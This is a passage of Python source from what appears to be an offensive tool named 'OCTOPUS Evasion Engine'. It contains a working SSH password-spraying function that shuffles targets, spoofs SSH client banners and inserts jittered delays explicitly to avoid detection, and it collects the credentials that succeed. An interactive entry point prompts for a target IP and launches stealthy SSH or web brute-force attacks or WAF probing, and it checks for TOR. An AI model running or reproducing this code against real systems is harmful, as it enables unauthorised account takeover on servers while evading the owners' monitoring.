        creds: List of (username, password) tuples.
        service: Protocol to spray (currently supports 'ssh').
        delay: Sleep time between attempts to avoid detection.
        
    Returns:
        List of successful login dicts: [{'target': ip, 'user': u, 'password': p}]
    """
    if not _PARAMIKO_OK and service == "ssh":
        print(f"  {C_RED}[!] paramiko not installed. Cannot perform SSH spray.{C_RESET}")
        return []

    if not targets or not creds:
        return []

    print(f"\n  {C_YELLOW}[*] Initiating Credential Spray ({service.upper()}){C_RESET}")
    print(f"  {C_GREY}Targets: {len(targets)} | Credentials: {len(creds)} | Delay: {delay}s{C_RESET}")

    successful_logins = []

    # Randomize targets slightly to avoid strict sequential patterns
    spray_targets = list(targets)
    random.shuffle(spray_targets)

    # SPRAY LOGIC: Outer loop = Credentials, Inner loop = Targets
    for user, pwd in creds:
        print(f"  {C_BLUE}[SPRAY] Testing {user}:{pwd} across {len(spray_targets)} targets...{C_RESET}")

        for target in spray_targets:
            # Skip targets we already compromised
            if any(s['target'] == target for s in successful_logins):
                continue

            try:
                if service == "ssh":
                    transport = paramiko.Transport((target, 22))
                    transport.connect()

                    # Randomize SSH banner
                    if hasattr(transport, 'local_version'):
                        transport.local_version = random.choice(_SSH_BANNERS)

                    transport.auth_password(user, pwd)
                    # If we reach here, auth succeeded
                    print(f"    {C_GREEN}[SUCCESS] {user}:{pwd} @ {target}{C_RESET}")
                    successful_logins.append({
                        "target": target,
                        "service": service,
                        "user": user,
                        "password": pwd
                    })
                    transport.close()
            except paramiko.AuthenticationException:
                pass  # Failed auth, expected
            except Exception as e:
                pass  # Connection refused, timeout, etc.
            finally:
                try:
                    if 'transport' in locals() and transport:
                        transport.close()
                except Exception:
                    pass

            # Jittered delay between hosts
            actual_delay = delay + random.uniform(0.1, 1.0)
            time.sleep(actual_delay)

        # Longer delay between credential batches
        time.sleep(delay * 2)

    return successful_logins



# ═══════════════════════════════════════════════
# QUICK TEST
# ═══════════════════════════════════════════════

if __name__ == "__main__":
    print(f"{C_RED}OCTOPUS Evasion Engine v4.1{C_RESET}")
    print(f"  paramiko: {'✓' if _PARAMIKO_OK else '✗'}")
    print(f"  requests: {'✓' if _REQUESTS_OK else '✗'}")
    print(f"  PySocks:  {'✓' if _SOCKS_OK else '✗'}")
    print(f"  TOR:      {'✓' if _check_tor_running() else '✗'}")

    target = input("\nTarget IP: ").strip()
    mode = input("Mode [ssh/web/detect]: ").strip().lower()

    if mode == "ssh":
        result = ssh_bruteforce_stealth(target, users=["root", "admin", "support"])
        print(result)
    elif mode == "web":
        url = input("Login URL: ").strip()
        result = web_bruteforce_stealth(url)
        print(result)
    elif mode == "detect":
        ws = WebEvasionSession()
        waf = ws.detect_waf(f"http://{target}")
        print(f"\nWAF Detection: {waf}")
